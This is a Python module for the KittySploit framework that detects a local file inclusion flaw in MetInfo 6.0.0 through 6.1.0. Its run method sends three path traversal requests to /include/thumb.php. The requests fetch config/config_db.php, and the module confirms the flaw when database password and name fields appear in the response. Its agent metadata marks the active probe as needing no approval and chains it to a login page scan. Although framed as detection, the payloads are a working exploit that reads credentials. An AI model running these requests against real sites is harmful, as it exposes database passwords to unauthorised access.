#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""MetInfo 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MetInfo <=6.1.0 - Local File Inclusion Detection',
        'description': 'MetInfo 6.0.0 through 6.1.0 is vulnerable to local file inclusion and allows remote unauthenticated attackers access to locally stored files and their content.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'metinfo', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://paper.seebug.org/676/'],
    }

    def run(self):
        for path in ('/include/thumb.php?dir=http/.....///.....///config/config_db.php', '/include/thumb.php?dir=.....///http/.....///config/config_db.php', '/include/thumb.php?dir=http\\\\..\\\\..\\\\config\\\\config_db.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_all = ('con_db_pass', 'con_db_name',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='high',
                    reason="MetInfo <=6.1.0 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

